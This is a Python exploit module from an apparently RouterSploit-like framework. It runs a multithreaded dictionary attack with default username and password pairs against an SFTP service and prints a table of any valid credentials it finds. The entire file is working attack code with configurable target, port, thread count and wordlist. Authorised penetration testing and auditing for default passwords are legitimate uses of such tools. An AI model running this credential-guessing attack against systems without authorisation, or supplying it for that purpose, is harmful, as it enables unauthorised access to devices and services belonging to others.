from embedxpl.core.exploit import *
from embedxpl.core.sftp.sftp_client import SFTPClient
from embedxpl.resources import wordlists


class Exploit(SFTPClient):
    __info__ = {
        "name": "SFTP Default Creds",
        "description": "Module performs dictionary attack with default credentials against SFTP service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
        "devices": (
            "Multiple devices",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(22, "Target SFTP port")

    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist(wordlists.defaults, "User:Pass or file with default credentials (file://)")

    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting default credentials attack against SFTP service")

        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        while running.is_set():
            try:
                username, password = data.next().split(":", 1)
                sftp_client = self.sftp_create()
                if sftp_client.login(username, password):
                    if self.stop_on_success:
                        running.clear()
                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))
                    sftp_client.close()
            except StopIteration:
                break

    @mute
    def check(self):
        sftp_client = self.sftp_create()
        if sftp_client.test_connect():
            print_status("Target exposes SFTP service", verbose=self.verbosity)
            return True
        print_status("Target does not expose SFTP", verbose=self.verbosity)
        return False

    @mute
    def check_default(self):
        if self.check():
            self.credentials = []
            data = LockedIterator(self.defaults)
            self.run_threads(self.threads, self.target_function, data)
            if self.credentials:
                return self.credentials
        return None